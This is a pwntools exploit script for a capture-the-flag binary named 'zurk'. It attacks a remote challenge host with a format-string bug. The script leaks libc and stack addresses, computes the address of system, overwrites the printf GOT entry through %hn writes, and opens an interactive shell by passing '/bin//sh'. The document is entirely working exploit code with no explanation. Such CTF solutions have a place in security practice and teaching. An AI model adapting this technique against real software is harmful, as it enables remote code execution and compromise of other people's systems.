#!/usr/bin/env python3
from pwn import *

#proc = process('./zurk')
proc = remote("binary.utctf.live", 9003)
printf_got_0 = p64(0x601024)
printf_got_1 = p64(0x601022)
printf_got_2 = p64(0x601020)

for _ in range(4):
    print(proc.recvline())

#leak libc and get system address
proc.sendline('%17$p')
libc_start_main = proc.recvline().decode().split(' ')[0]
libc_start_main = int(libc_start_main, 16)
libc_base = libc_start_main - 0x20740
system = libc_base + 0x45390
str_system = str(hex(system))[2:]

#break into 2 byte components
sys_0 = int(str_system[0:4], 16)
sys_1 = int(str_system[4:8], 16)
sys_2 = int(str_system[8:12], 16)

#leak previous stack frame
proc.recvline()
proc.sendline('%14$p')
prev_f = proc.recvline().decode().split(' ')[0]
prev_f = int(prev_f, 16)
curr_f = prev_f - 0x50
print("stack addr: "+hex(curr_f))

#write system address to printf GOT entry, 2 bytes at a time
proc.recvline()
p = printf_got_0 + printf_got_1 + printf_got_2 
p += b'%' + str(sys_0).encode() + b'%6$hn'
p += b'%' + str(sys_1).encode() + b'%7$hn'
p += b'%' + str(sys_2).encode() + b'%8$hn'
print(p)

proc.sendline(p)

#pass /bin/sh to printf (now system)
print(proc.recvline())
print(proc.recvline())
proc.sendline('/bin//sh')
print(proc.recvline())
print(proc.recvline())
proc.interactive()
